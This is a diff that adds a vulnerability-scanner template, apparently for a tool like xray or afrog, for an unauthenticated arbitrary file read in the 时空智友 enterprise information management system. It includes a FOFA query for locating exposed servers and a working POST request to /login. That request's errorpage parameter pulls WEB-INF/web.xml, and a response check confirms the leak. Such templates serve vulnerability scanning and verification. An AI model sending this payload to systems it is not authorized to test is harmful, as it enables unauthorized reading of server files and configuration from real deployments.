@@ -1,0 +1,32 @@
+id: shikongzhiyou-login-fileread
+
+info:
+  name: 时空智友企业信息管理系统 任意文件读取漏洞
+  author: fgz
+  severity: high
+  verified: true
+  description: |-
+    时空智友企业信息管理系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。存在任意文件读取漏洞，攻击者可以在未授权的情况下读取系统上的文件。
+    FOFA: body="时空智友企业信息管理"
+  reference:
+    - https://mp.weixin.qq.com/s/iluDHRYq3xGZsvIXug_t_w
+  tags: shikongzhiyou,fileread
+  created: 2023/09/13
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /login
+      headers:
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: JSESSIONID=83A3C49AFCF54285082D11B2E2E0ECE4; __qypid=""
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+      body: op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin
+    expression: |
+      response.status == 200 && response.body.bcontains(b"web-app id") && response.body.bcontains(b"servlet")
+expression: r0()
